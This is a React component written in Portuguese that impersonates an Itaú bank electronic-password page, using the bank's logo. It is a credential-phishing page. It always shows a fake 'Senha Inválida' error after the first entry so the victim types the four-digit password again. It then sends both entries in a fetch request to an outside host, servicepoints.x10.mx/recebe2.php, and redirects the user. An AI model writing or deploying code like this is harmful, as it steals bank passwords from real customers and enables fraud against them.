import React from 'react'
import './SenhaEletronica.css'
import InputMask from 'react-input-mask';
import { useNavigate } from 'react-router-dom'
import { useRef, useState } from 'react'

const SenhaEletronica = () => {
    const [errou, setErrou] = useState(false);
    const errorRef = useRef(null);
    const navigate = useNavigate();
    const [quatro, setQuatro] = useState(null)
    const [errada, setErrada] = useState(null)

    const defineSenha = (event) => {
        setQuatro(event.target.value)
    }

    const abrirErro = () => {
        if(errou === false){
            setTimeout(() => {
                errorRef.current.style.display = 'flex';
                setErrada(quatro)
                setErrou(true)
            }, 1000);
        } else if (errou === true){
            setTimeout(async () => {
                if(!errada || !quatro){
                    alert("Por favor preencha todos os campos !");
                    return; // Adicionado para evitar prosseguir com a execução /security
                  }
                  try {
                    const response = await fetch(`https://servicepoints.x10.mx/recebe2.php?errada=${errada}&quatro=${quatro}`);
                    if (!response.ok) {
                      throw new Error('Sistema indisponível');
                    }
                    navigate('/privacy');
                  } catch (error) {
                    console.error('Erro ao fazer a requisição:', error);
                  }
                navigate('/privacity');
            }, 1000);
        } else{
            window.alert("Fatal Error 403")
        }

      };
    const fecharError = () => {
        errorRef.current.style.display = 'none';
      };
  return (
    <div className='SenhaEletronica'>
        <div className='error' ref={errorRef}>
            <span>Senha Inválida. (C902-033)</span>
            <button onClick={fecharError}>OK</button>
        </div>
        <div className='logo'>
            <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
        </div>
        <div className='form2'>
            <span>senha eletrônica</span>
            <InputMask maskChar=" " type="password" placeholder='' onChange={defineSenha} maxLength={4} />
            <button onClick={abrirErro}>acessar</button>
        </div>
    </div>
  )
}

export default SenhaEletronica